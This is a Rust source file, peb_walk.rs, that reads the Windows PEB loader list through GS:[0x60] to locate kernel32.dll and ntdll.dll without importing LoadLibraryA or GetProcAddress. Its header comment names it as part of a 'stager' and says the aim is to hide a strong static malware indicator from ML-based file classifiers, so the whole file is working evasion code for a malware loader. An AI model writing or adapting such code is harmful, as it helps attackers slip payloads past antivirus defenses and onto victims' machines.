// peb_walk.rs — Find kernel32.dll base via PEB InLoadOrderModuleList.
//
// Removes LoadLibraryA/GetProcAddress from the import table. Without this,
// the stager has a tiny IAT with only those two kernel32 functions, which
// is a strong static malware indicator for ML-based file classifiers.
//
// x64 offsets (stable since Vista):
//   GS:[0x60]   → *PEB
//   PEB + 0x18  → *PEB_LDR_DATA
//   LDR + 0x10  → InLoadOrderModuleList head
//   LDTE + 0x30 → DllBase
//   LDTE + 0x58 → BaseDllName.Length
//   LDTE + 0x60 → BaseDllName.Buffer

use core::arch::asm;

#[inline(always)]
unsafe fn get_peb() -> *mut u8 {
    let peb: *mut u8;
    asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, nomem));
    peb
}

#[inline(always)]
unsafe fn name_matches(buf: *const u16, chars: usize, target: &[u16]) -> bool {
    if chars != target.len() { return false; }
    let mut i = 0;
    while i < target.len() {
        let c = *buf.add(i);
        let cl = if c >= b'A' as u16 && c <= b'Z' as u16 { c + 0x20 } else { c };
        if cl != target[i] { return false; }
        i += 1;
    }
    true
}

/// Find a loaded module by UTF-16 lowercase name. Returns DllBase or null.
#[inline(always)]
pub unsafe fn find_module(lowercase_utf16: &[u16]) -> *const u8 {
    let peb = get_peb();
    let ldr = (peb.add(0x18) as *const *mut u8).read();
    let head = ldr.add(0x10) as *mut *mut u8;

    let mut entry = (*head) as *mut u8;
    while entry as *mut *mut u8 != head {
        let name_bytes = (entry.add(0x58) as *const u16).read_unaligned() as usize;
        let name_buf   = (entry.add(0x60) as *const *const u16).read_unaligned();
        let dll_base   = (entry.add(0x30) as *const *const u8).read_unaligned();
        let name_chars = name_bytes / 2;

        if !name_buf.is_null() && name_matches(name_buf, name_chars, lowercase_utf16) {
            return dll_base;
        }
        entry = (*(entry as *const *mut u8)) as *mut u8;
    }
    core::ptr::null()
}

/// Return the base address of kernel32.dll, or null on failure.
#[inline(always)]
pub unsafe fn find_kernel32() -> *const u8 {
    const NAME: [u16; 12] = [
        b'k' as u16, b'e' as u16, b'r' as u16, b'n' as u16,
        b'e' as u16, b'l' as u16, b'3' as u16, b'2' as u16,
        b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
    ];
    find_module(&NAME)
}

/// Return the base address of ntdll.dll, or null on failure.
#[inline(always)]
pub unsafe fn find_ntdll() -> *const u8 {
    const NAME: [u16; 9] = [
        b'n' as u16, b't' as u16, b'd' as u16, b'l' as u16,
        b'l' as u16, b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
    ];
    find_module(&NAME)
}
